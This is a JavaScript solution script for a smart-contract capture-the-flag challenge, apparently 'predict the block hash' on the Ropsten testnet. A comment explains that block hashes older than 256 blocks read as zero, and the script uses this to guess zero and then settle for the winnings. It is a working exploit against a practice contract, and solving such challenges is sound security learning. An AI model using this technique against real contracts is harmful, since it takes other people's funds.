/**
 * SOLUTION
 *
 * The block hashes are not available for all blocks for scability reasons. You can only
 * access the hashes of the most recent 256 blocks, all other values will be zero.
 *
 * Locked in a guess with zero and then waited 256 to settle the bet. Voilá.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectId = fs.readFileSync("../.infura").toString().trim();

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: `https://ropsten.infura.io/v3/${infuraProjectId}`,
});

const web3 = new Web3(provider);

const abi = JSON.parse(fs.readFileSync('./abi/6_predict_the_block_hash.json'));

const contractAddress = "0x9cfDBcE34c3b118120092bc0Ecd3a6d78873483f";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();

    const contract = new web3.eth.Contract(abi, contractAddress);

    const gasPrice = await web3.eth.getGasPrice();

    /**
     * 1st step
     */
    // const amountToSend = Web3Utils.toWei("1", "ether");
    // const guess = "0x0000000000000000000000000000000000000000000000000000000000000000";
    // const res = await contract.methods
    //   .lockInGuess(guess)
    //   .send({ from: accounts[0], value: amountToSend, gasPrice });

    // console.log(res);

    /**
     * 2nd step - run after 256 blocks
     */
    const res = await contract.methods
      .settle()
      .send({ from: accounts[0], gasPrice });

    console.log(res);

  } catch (ex) {
    console.warn(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
